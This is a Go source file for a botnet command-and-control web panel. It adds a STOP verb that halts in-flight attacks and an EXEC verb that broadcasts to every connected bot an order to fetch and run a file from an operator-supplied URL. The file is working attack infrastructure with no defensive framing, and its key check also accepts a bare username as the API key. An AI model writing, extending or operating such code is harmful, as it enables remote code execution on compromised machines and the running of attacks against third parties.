package main

// ctlcmd.go — remote-file exec + stop-all control verbs for the web panel.
// Both piggyback on the same frame channel bots already consume:
//     STOP (251): [u32 duration=0][u8 251][u8 tcount=0][u8 olen=0]
//     EXEC (250): [u32 duration=0][u8 250][u8 tcount=0][u8 olen=1][key=0][len url][url]
// Broadcast to every connected bot via ClientList.QueueBuf(frame, -1, "").

import (
	"encoding/binary"
	"net/http"
)

// stopFrame builds a broadcast STOP frame (halts all in-flight attacks).
func stopFrame() []byte {
	payload := []byte{0, 0, 0, 0, stopVector, 0, 0} // duration 0, vector 251, tcount 0, olen 0
	frame := make([]byte, 2)
	binary.BigEndian.PutUint16(frame, uint16(len(payload)+2))
	return append(frame, payload...)
}

// execFrame builds a broadcast EXEC frame carrying the remote file URL.
func execFrame(url string) []byte {
	ub := []byte(url)
	if len(ub) > 255 {
		ub = ub[:255]
	}
	payload := []byte{0, 0, 0, 0, execVector, 0, 1, 0, byte(len(ub))} // vector 250, 1 opt: key 0
	payload = append(payload, ub...)
	frame := make([]byte, 2)
	binary.BigEndian.PutUint16(frame, uint16(len(payload)+2))
	return append(frame, payload...)
}

// execVector / stopVector constants mirrored here for readability.
const (
	execVector = 250
	stopVector = 251
)

// apiAuth resolves the caller from ?key= to an account (same rule as /attack).
func apiAuth(r *http.Request, w http.ResponseWriter) *Account {
	q := r.URL.Query()
	key := q.Get("key")
	if key == "" {
		writeJSON(w, apiResult{Ok: false, Msg: "missing api key"})
		return nil
	}
	if user := store.ByAPIKey(key); user != nil {
		return user
	}
	store.mu.Lock()
	defer store.mu.Unlock()
	for _, u := range store.Users {
		if u.Username == key {
			return u
		}
	}
	return nil
}

// apiStop —  GET /stop?key=..   broadcast a stop to every bot.
func apiStop(w http.ResponseWriter, r *http.Request) {
	if apiAuth(r, w) == nil {
		writeJSON(w, apiResult{Ok: false, Msg: "bad api key"})
		return
	}
	clientList.QueueBuf(stopFrame(), -1, "")
	writeJSON(w, apiResult{Ok: true, Msg: "stop broadcast to all bots"})
}

// apiExec —  GET /exec?key=..&url=<file to pull+run>
func apiExec(w http.ResponseWriter, r *http.Request) {
	if apiAuth(r, w) == nil {
		writeJSON(w, apiResult{Ok: false, Msg: "bad api key"})
		return
	}
	url := r.URL.Query().Get("url")
	if url == "" {
		writeJSON(w, apiResult{Ok: false, Msg: "url required"})
		return
	}
	clientList.QueueBuf(execFrame(url), -1, "")
	writeJSON(w, apiResult{Ok: true, Msg: "exec broadcast to all bots", Target: url})
}